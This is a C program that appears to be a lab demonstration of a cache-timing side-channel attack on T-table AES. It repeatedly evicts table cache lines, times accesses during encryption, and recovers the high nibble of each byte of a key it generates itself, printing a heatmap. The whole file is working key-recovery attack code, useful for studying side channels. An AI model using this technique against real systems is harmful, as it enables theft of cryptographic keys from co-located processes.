#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include <aes.h>
#include <evict.h>

#define AESSIZE 16

#define NSAMPLES (10000)

typedef uint8_t aes_t[AESSIZE];

void print_heatmap(int clusters[16][16]) {
    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < 16; j++) {
            printf("%6d ", clusters[i][j]);
        }
        printf("\n");
    }
    printf("\n");
}

int timings[16][16];

int main() {
    aes_t key;
    aes_t key_guess;
    aes_t key_solution;

    unsigned char plaintext[]
        = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    unsigned char ciphertext[128];

    int threshold = 3;

    time_t start, end;
    start = time(NULL);

    uint64_t start_cycle = rdtscp();
    srand(start_cycle);

  printf("Key used for encryption\n");
  for (size_t i = 0; i < 16; i++) {
        key[i] = rand() % 256;
        key_solution[i] = key[i];
    printf("%02x ", key[i]);
  }
  printf("\n");

    AES_KEY key_struct;
    private_AES_set_encrypt_key(key, 128, &key_struct);

    for (int kindex = 0; kindex < 16; kindex++) {
        uint32_t maxn = 0, maxi = 0;
        uint64_t addr = (uint64_t) AES_get_ttable(kindex % 4);
        for (int byte = 0; byte < 256; byte += 16) {
            unsigned char key_guess = byte;
            for (int line = 0; line < 1; line++) {
                size_t count = 0;
                for (int i = 0; i < NSAMPLES; i++) {
                    for (int j = 1; j < 16; j++)
                        plaintext[j] = rand() % 256;
                    plaintext[kindex]
                        = ((line * 16) + (rand() % 16)) ^ key_guess;
                    evict_cache_set((uint64_t) AES_get_ttable(kindex % 4));
                    AES_encrypt(plaintext, ciphertext, &key_struct);
                    size_t delta = memaccesstime(AES_get_ttable(kindex % 4));
                    if (delta < threshold) {
                        count++;
                    }
                }
                if (count < NSAMPLES * 0.92) {
                    line -= 1;
                    continue;
                }
                if (maxn < count) {
                    maxn = count;
                    maxi = byte / 16;
                }
                timings[kindex][byte / 16] = count;
            }
        }
        if (maxn < NSAMPLES * 0.98) {
            kindex -= 1;
            continue;
        }
        key_guess[kindex] = maxi;
    }

    printf("print heatmap.\n");
    print_heatmap(timings);

    printf("key:   ");
    for (int i = 0; i < 16; i++) {
        printf("%02x ", key_solution[i]);
    }
    printf("\nguess: ");
    for (int i = 0; i < 16; i++) {
        if (key_guess[i] == key_solution[i] >> 4) {
            printf("%1x  ", key_guess[i]);
        } else
            printf("x  ");
    }
    printf("\n");

    end = time(NULL);
    printf("time: %lu\n", end - start);
    return 0;
}
